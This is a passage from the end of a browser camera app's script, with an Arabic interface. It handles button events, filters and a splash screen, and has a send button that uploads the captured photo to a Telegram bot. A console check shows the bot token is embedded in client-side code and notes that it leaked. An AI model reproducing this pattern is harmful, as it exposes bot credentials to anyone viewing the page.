    showToast('الكاميرا جاهزة', 'success', 1500);
  } else {
    btn.disabled = false;
    btn.innerHTML = originalHTML;
  }
});

$('error-retry').addEventListener('click', async () => {
  errorScreen.classList.remove('show');
  startScreen.classList.remove('hide');
  startScreen.style.display = 'flex';
  await new Promise(r => setTimeout(r, 300));
});

$('error-reload').addEventListener('click', () => {
  location.reload();
});

shutter.addEventListener('click', capturePhoto);

$('flip-btn').addEventListener('click', flipCamera);

$('flash-btn').addEventListener('click', () => {
  showToast('الفلاش غير مدعوم في المتصفح حالياً', 'info', 2000);
});

$('filter-toggle').addEventListener('click', (e) => {
  state.filterEnabled = !state.filterEnabled;
  e.currentTarget.classList.toggle('active', state.filterEnabled);
  applyFilter(state.currentFilter);
  showToast(state.filterEnabled ? 'الفلتر مفعّل' : 'الفلتر متوقف', 'info', 1200);
});

$('retake-btn').addEventListener('click', hidePreview);

$('send-btn').addEventListener('click', () => {
  uploadToTelegram(state.capturedBlob);
});

$('download-btn').addEventListener('click', downloadPhoto);

$('gallery-btn').addEventListener('click', () => {
  if (state.capturedDataUrl) showPreview();
  else showToast('لا توجد صورة حديثة', 'info');
});

previewScreen.addEventListener('click', (e) => {
  if (e.target === previewScreen) hidePreview();
});

// منع سحب الصفحة بالزوم
document.addEventListener('touchmove', (e) => {
  if (e.touches.length > 1) e.preventDefault();
}, { passive: false });

/* ============================================================
   🚀 الإقلاع
   ============================================================ */
buildFiltersBar();
applyFilter(FILTERS[0]);

// اخفِ السبلاش
setTimeout(() => {
  splash.classList.add('hide');
  setTimeout(() => { splash.style.display = 'none'; }, 800);
}, 2400);

// تحذير لو التوكن لسه قديم
if (CONFIG.BOT_TOKEN.startsWith('8926051784')) {
  console.warn('⚠️ التوكن ده اتكشف في المحادثة! غيّره من @BotFather فوراً');
}

// راقب تغيير الصلاحية
if (navigator.permissions && navigator.permissions.query) {
  navigator.permissions.query({ name: 'camera' }).then((result) => {
    result.addEventListener('change', () => {
      console.log('Camera permission:', result.state);
      if (result.state === 'granted') {
        showToast('تم منح الصلاحية، اضغط ابدأ التصوير', 'success', 2500);
      }
    });
  }).catch(() => {});
}
</script>
